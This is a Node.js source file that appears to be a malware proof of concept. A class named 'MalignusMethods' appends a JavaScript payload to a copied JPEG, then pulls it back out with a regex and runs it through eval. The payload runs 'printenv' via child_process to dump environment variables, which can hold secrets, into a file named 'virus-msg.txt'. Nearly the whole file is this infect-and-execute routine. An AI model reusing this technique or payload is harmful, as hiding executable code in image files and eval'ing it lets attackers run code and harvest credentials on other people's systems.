const fs = require('fs');
const path = require('path');

const ONE_MB = 1024 * 1024;
const THIRTY_TWO_MB = 32 * ONE_MB;

const w = async (text, filePath, encoding) => {
  const stream = fs.createWriteStream(path.resolve(filePath), {
    flags: 'a',
    highWaterMark: THIRTY_TWO_MB,
    encoding,
  });

  return new Promise((resolve, reject) => {
    stream.once('finish', resolve);
    stream.once('error', reject);

    stream.write(`${text}\n`, (err) => {
      if (err) reject(err);
      stream.end();
    });
  });
}


const r = async (target, encoding, cb, file) => {
  const stream = fs.createReadStream(path.resolve(target), {
    encoding,
  });

  stream.on("data", (c) => cb?.(c, file, encoding))

  if (!cb) {
    const chunks = [];
    for await (const chunk of stream) {
      chunks.push(chunk);
    }
    stream.destroy();
    return chunks.join('');
  }
}



const lsThreeDir = (dirPath) => {
  const files = fs.readdirSync(dirPath);

  const result = [];

  for (const file of files) {
    const filePath = path.join(dirPath, file);
    const stat = fs.statSync(filePath);

    if (stat.isDirectory()) {
      result.push(...lsThreeDir(filePath));
    } else {
      result.push(filePath);
    }
  }

  return result;
}


class MalignusMethods {
  constructor() {
    this.w = w;
    this.r = r;
    this.lsThreeDir = lsThreeDir;
  }

  async copyImgToInfect() {
    await this.r("./target/img-target.jpeg", "binary", this.w, "./tmp/img-target-node.jpeg")
  }

  async infectImg() {
    setTimeout(() => {
      this.w(`#$%{const {exec} = require("child_process"); exec('printenv > virus-msg.txt', (err) =>  console.log(err));}`, "./tmp/img-target-node.jpeg", "binary")
    }, 5e3);
  }

  async runImg() {
    setTimeout(async () => {
      const c = await this.r("./tmp/img-target-node.jpeg", "utf8")
      const regex = /#\$\%\{(.*)\}/g;
      const code = regex.exec(c);

      eval(code[1]);
    }, 5e3);
  }

}

module.exports = {
  w, r
}